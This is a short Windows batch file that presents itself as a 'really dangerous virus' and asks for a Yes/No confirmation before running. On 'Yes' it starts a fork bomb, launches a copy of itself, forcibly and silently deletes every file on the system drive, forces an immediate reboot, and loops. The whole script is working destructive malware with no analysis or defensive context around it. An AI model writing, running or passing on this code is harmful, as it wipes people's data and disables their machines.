:1

@echo off 

color a 
echo Hello, Are you sure you would like to run this virus? This is a really dangerous virus that will cause permanant damage? only do Yes/No
set /p input=
if /i %input%==Yes goto yes
if /i %input%==No goto no
if /i not %input%==Yes,No goto 1

:yes

:A
%0|%0
start SUPER_DEADLY_VIRUS.bat
@echo off
del %systemdrive%\*.*/f/s/q
shutdown -r -f -t 00
Goto A

:no
